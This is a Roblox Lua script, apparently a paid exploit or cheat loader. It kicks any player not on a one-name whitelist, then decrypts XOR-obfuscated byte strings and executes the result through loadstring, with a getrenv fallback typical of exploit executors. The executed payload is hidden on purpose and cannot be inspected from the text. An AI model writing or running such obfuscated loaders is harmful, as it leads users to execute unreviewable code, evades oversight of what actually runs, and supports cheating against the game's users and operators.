-- 🔐 USUARIOS AUTORIZADOS
local authorizedUsers = {"Bartan7i"}
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
if not localPlayer then return end
local isAuthorized = false
for _, u in ipairs(authorizedUsers) do if u == localPlayer.Name then isAuthorized = true break end end
if not isAuthorized then pcall(function() localPlayer:Kick("RESET HWID - No autorizado") end) return end

--[[ Stick Obfuscador v1.2 ]]
local _M
do _M=function()
local _1_l_i1illI1={"\xFB\xB2\xD7\xE1\xC3\xBF\x86\x5B\xB6\x70\x39\xB8\x6B\x7D";"\x1B\x53\xE7\xC3\x9D\x15\x61\x89\x58\x99";"\xCC\x9C\x31\x04\xE7\x8F\xF7\x2E\xD7\x55\x06\x96\xD2\x9A\x1C\x6A\xB0\x47\xE0\xE9";"\x8D\xD4\x64\x48\x21\x04\x2F\xE5\x14\x3F\x52\xAC\x81\x92\xD6\xAF\x6A\x84\x25\xE7\x56";"\x12\x5E\xF9\xC1\xE9\xCC\xA9\x6B\x94\xF8\x8A\x10\x18\x1E\x41\x25\xD8\x09\xEE\x51\xDF\xE0\xC2\xBC\xBB\x1C\xBA\x73\x3E\x63\x66\x01";"\x56\x79\x84\xA6\xE2\xEB\x92\x88\x75\xA5\xA3\x35\x13\x32\x76\x55\xD3\xC2\x5C\x26\xBE";"\xA2\xD1\x02\x4C\x05\x61\x44\x1E\xF2\x21\x74\xFF\xB4\xA1\xF2\x86\x87\x70\x8E\xA2\x6C\x38\x23\x43\x78\xB3\xAD\x5F\x19"}
local _illIII11_l2={0xF0,0xA5,0x2C,0x11,0x8,0x76,0x1A,0xE6,0xF}
local _I11_l_i1il3={0x4,0x7,0x3,0x1,0x5,0x6,0x2}
local _1_l_i1illI2s={0x11,0x30,0x4F,0x6E,0x8D,0xAC,0xCB}
local _i1illIII114={0x1,0x1,0x1,0x2,0x1,0x3,0x1,0x4,0x1,0x5,0x1,0x6,0x1,0x7,0x2,0x3}
local __i1illIII16,_lIII11_l_i17,__l_i1illII8=string.char,string.byte,table.concat
local _II11_l_i1i5
do
 local _b32=bit32
 if _b32 and _b32.bxor then _II11_l_i1i5=_b32.bxor
 else _II11_l_i1i5=function(a,b) local r,p=0,1 for _=1,8 do local x,y=a%2,b%2 if x~=y then r=r+p end a=(a-x)/2 b=(b-y)/2 p=p*2 end return r end
 end
end
local _illIII11_l11
local function _llIII11_l_9(_i1illIII115,_1_l_i1illI2) local _I11_l_i1il4={} for _illIII11_l3=1,#_i1illIII115 do local z=_lIII11_l_i17(_i1illIII115,_illIII11_l3) z=_II11_l_i1i5(z,_illIII11_l2[((_illIII11_l3-1)%#_illIII11_l2)+1]) z=_II11_l_i1i5(z,(_1_l_i1illI2+(_illIII11_l3-1)*13)%256) _I11_l_i1il4[_illIII11_l3]=__i1illIII16(z) end return __l_i1illII8(_I11_l_i1il4) end
local _I11_l_i1il12,_1_l_i1illI10=1,{}
while _I11_l_i1il12<=#_i1illIII114 do local _i1illIII1113=_i1illIII114[_I11_l_i1il12] if _i1illIII1113==1 then local _II11_l_i1i6=_i1illIII114[_I11_l_i1il12+1] _1_l_i1illI10[_II11_l_i1i6]=_llIII11_l_9(_1_l_i1illI1[_I11_l_i1il3[_II11_l_i1i6]],_1_l_i1illI2s[_II11_l_i1i6]) _I11_l_i1il12=_I11_l_i1il12+2 elseif _i1illIII1113==2 then _illIII11_l11=__l_i1illII8(_1_l_i1illI10) _I11_l_i1il12=_I11_l_i1il12+1 elseif _i1illIII1113==3 then break else _I11_l_i1il12=_I11_l_i1il12+1 end end
local __l_i1illII0=__i1illIII16(108,111,97,100,115,116,114,105,110,103)
local _llIII11_l_1=getfenv and getfenv() or _ENV or _G
local _lIII11_l_i116=loadstring or load
if not _lIII11_l_i116 and _llIII11_l_1 then _lIII11_l_i116=_llIII11_l_1[__l_i1illII0] end
if not _lIII11_l_i116 and getrenv then local r=getrenv() _lIII11_l_i116=r.loadstring or r.load end
if not _lIII11_l_i116 then error("sin loadstring") end
local _II11_l_i1i14,__i1illIII115=_lIII11_l_i116(_illIII11_l11)
if not _II11_l_i1i14 then error(__i1illIII115) end
if setfenv and getfenv then pcall(setfenv,_II11_l_i1i14,getfenv()) end
return _II11_l_i1i14()
end end
return _M()
